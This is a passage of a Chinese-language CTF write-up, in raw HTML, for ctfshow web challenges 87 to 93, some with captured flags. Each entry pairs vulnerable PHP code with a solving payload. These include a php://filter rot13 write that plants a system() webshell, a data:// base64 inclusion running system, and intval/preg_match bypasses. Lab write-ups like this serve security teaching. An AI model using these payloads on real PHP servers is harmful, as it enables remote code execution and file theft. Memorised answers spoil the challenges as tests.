id=\"web87\"><a class=\"anchor\" href=\"#web87\">#</a> web87</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-16 21:57:55</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die('大佬别秀了');?>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>这里他改变了形式，成写入，绕过过滤写入个文件即可\n\n?file=php://filter/write=string.ror13/resource=1.php\n\n这里因为file_put_contents(urldecode)所以我们需要对以上代码进行urlencode全字符编码两次\n?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30\n\n然后post方式输出content=&lt;?php system('tac f*.php');?&gt;\n&lt;?php system('tac f*.php');?&gt;需要进行rot13编码\n\n\npayload：\n?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30\npost:content=&lt;?cuc flfgrz('gnp s*.cuc');?&gt;\n\n</code></pre>\n<pre><code>ctfshow&#123;3d4bd38d-7bbc-43df-a5ab-6833c91e9edf&#125;\n</code></pre>\n<h2 id=\"web88\"><a class=\"anchor\" href=\"#web88\">#</a> web88</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-17 02:27:25</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>过滤了很多，但是没过滤：所以还是能用php伪协议，这里我们用data://，base64时记得删掉后面的=\n\npayload:\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs\n</code></pre>\n<pre><code>ctfshow&#123;30bb2962-3cc0-427e-906e-8d32462fe7c4&#125;\n</code></pre>\n<h2 id=\"web116\"><a class=\"anchor\" href=\"#web116\">#</a> web116</h2>\n<p>剪辑视频</p>\n<p>抓包</p>\n<p>file=flag.php</p>\n<p>即可返回 flag</p>\n<h1 id=\"php特性\"><a class=\"anchor\" href=\"#php特性\">#</a> php 特性</h1>\n<h2 id=\"web89\"><a class=\"anchor\" href=\"#web89\">#</a> web89</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 15:38:51</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>过滤了数字，我们可以利用数组绕过\n\npayload:\n?num[]=1\n</code></pre>\n<h2 id=\"web90\"><a class=\"anchor\" href=\"#web90\">#</a> web90</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 16:06:11</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"4476\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>4476转换十六进制0x117c\n\npayload:\n?num=0x117c\t\t//十六进制\n?num=010574\t\t//八进制\t\n?num=4476a\t\t//===强比较\n</code></pre>\n<h2 id=\"web91\"><a class=\"anchor\" href=\"#web91\">#</a> web91</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Firebasky</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 16:16:09</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^php$/im'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^php$/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'nonononono'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>Notice<span class=\"token punctuation\">:</span> Undefined index<span class=\"token punctuation\">:</span> cmd in <span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php on line <span class=\"token number\">15</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>nonononono</span></pre></td></tr></table></figure><pre><code>这里主要的突破点就是/m，我们可以看到第一个preg_match()函数，有个/m，而第二个正则则没有，我们可以利用换行进行绕过%0a\n\npayload:\n?cmd=%0aphp\n</code></pre>\n<h2 id=\"web92\"><a class=\"anchor\" href=\"#web92\">#</a> web92</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Firebasky</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 16:29:30</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no no no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">4476</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>==弱比较，所以4476a和4476相等\n这时只能通过十六进制绕过\n\npayload：\n?num=0x117c\t\t//十六进制\n?num=4476e123\n</code></pre>\n<h2 id=\"web93\"><a class=\"anchor\" href=\"#web93\">#</a> web93</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Firebasky</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-18 16:32:58</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 